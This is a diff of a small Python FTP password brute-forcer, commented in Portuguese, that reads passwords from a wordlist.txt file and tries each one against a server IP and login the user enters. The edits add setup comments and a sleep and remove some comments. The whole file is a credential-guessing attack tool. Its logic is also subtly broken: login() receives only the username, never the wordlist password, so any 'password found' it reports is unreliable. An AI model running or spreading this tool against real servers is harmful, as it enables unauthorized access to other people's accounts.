@@ -1,11 +1,12 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-# ANTES DE TUDO, CRIE UMA PASTA .TXT NA SUA DESKTOP COM O NOME DE wordlist.txt COM AS SUAS SENHAS.
+# ANTES DE TUDO, CRIE UMA PASTA .TXT NA SUA DESKTOP COM O NOME DE wordlist.txt COM AS SUAS SENHAS!
+# E TAMBÉM SALVE O PROGRAMA EM PYTHON NA SUA ÁREA DE TRABALHO!
 
 # IMPORTANDO A LIB DO FTP
 import ftplib
-
+import time
 
 print('''
 
@@ -32,21 +33,20 @@ try:
     login_ftp = input("\n [+] Digite o Login do Servidor FTP: ")
 
     print('\n --------------------------------------------')
-    arquivo = open("wordlist.txt", "r") # PARTE QUE O PROGRAMA IRÁ AUTOMATICAMENTE ABRIR UMA .TXT COM NOME WORLIST NA DESKTOP
-    for linha in arquivo.readlines(): # AQUI O PROGRAMA IRÁ LER CADA LINHA DESTA LISTA, O R É READLINES, OU SEJA, LER
+    arquivo = open("wordlist.txt", "r")
+    for linha in arquivo.readlines():
         try:
 
-            servidor = ftplib.FTP(ip) # ENFIM, CHEGAMOS NA ÁREA DA CONEXÃO E OS TESTES DE SENHA
+            servidor = ftplib.FTP(ip)  # ENFIM, CHEGAMOS NA ÁREA DA CONEXÃO E OS TESTES DE SENHA
             servidor.login (login_ftp)
             print(' --------------------------------------------')
             print("\n [!] Senha Encontrada: % s" % linha)
             print(' --------------------------------------------')
-            break # CASO O PROGRAMA ENCONTRE A SENHA CORRETA, ELE IRÁ PARAR 
-            raise SystemExit
+            break # CASO O PROGRAMA ENCONTRE A SENHA CORRETA, ELE IRÁ PARAR
         except ftplib.error_perm:
             print("\n [-] Senha Incorreta:  % s" % linha)
             print('\n --------------------------------------------')
 except KeyboardInterrupt:
     print("\n [!] Fim do Programa!")
-    
+    time.sleep(0.6)
                        
